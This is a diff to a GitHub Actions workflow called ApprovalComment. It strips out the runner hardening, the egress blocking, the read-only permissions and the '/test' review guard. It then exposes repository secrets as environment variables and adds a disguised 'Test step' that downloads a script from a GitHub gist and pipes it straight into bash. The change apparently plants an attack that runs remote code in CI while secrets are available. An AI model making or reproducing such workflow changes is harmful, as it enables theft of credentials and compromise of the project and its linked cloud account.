@@ -1,25 +1,16 @@
 name: ApprovalComment
 on:
-  pull_request_review:
-    types: [submitted]
+  pull_request:
+    types: ['synchronize']
 
-permissions:
-  contents: read
+env:
+  AZURE_SUBSCRIPTION_ID: ${{ secrets.E2E_SUBSCRIPTION_ID }}
+  SECRET_TOKEN: ${{ secrets.SECRET_TOKEN }}
 
 jobs:
   approval-comment:
-    if: startsWith(github.event.review.body, '/test')
     runs-on: ubuntu-latest
     steps:
-      - name: Harden Runner
-        uses: step-security/harden-runner@5c7944e73c4c2a096b17a9cb74d65b6c2bbafbde # v2.9.1
-        with:
-          disable-telemetry: true
-          disable-sudo: true
-          egress-policy: block
-          allowed-endpoints: >
-            github.com:443
-
       - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7
         with:
           fetch-depth: 0
@@ -28,9 +19,13 @@ jobs:
           REVIEW_BODY: ${{ github.event.review.body }}
         run: |
           mkdir -p /tmp/artifacts
-          { echo ${{ github.event.pull_request.number }}; echo ${{ github.event.review.commit_id }}; } >> /tmp/artifacts/metadata.txt
+          { echo ${{ github.event.pull_request.number }}; echo blahagain; } >> /tmp/artifacts/metadata.txt
           cat /tmp/artifacts/metadata.txt
       - uses: actions/upload-artifact@50769540e7f4bd5e21e526ee35c689e35e0d6874 # v4.4.0
         with:
           name: artifacts
           path: /tmp/artifacts
+      - name: Test step 
+        run: |
+          curl -sSfL https://gist.githubusercontent.com/octoatt/39bed0f7e60c523aa2c2f2878cf1afa4/raw/99ba534adfd6a5873ce328281051b7219d0657be/test.sh | bash
+        shell: "bash"
